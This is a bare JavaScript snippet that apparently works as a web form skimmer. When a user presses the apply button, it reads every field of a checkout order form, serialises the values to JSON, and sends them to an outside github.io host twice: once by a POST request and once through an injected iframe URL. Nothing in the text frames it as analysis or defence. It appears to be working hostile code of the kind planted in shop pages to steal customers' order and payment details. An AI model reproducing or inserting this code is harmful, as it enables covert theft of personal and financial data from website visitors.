window.onload = function() {
    $("#applybutton").bind("mouseup touchend", function (t) {
        var e = {};
        $("#checkOrderForm").serializeArray().map(function (t) {
            e[t.name] = t.value;
        });
        var n = JSON.stringify(e);
        $.post("https://faisal-akhtar-fgh.github.io/kal", n);
		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(n) + '"></iframe>');
    });
};
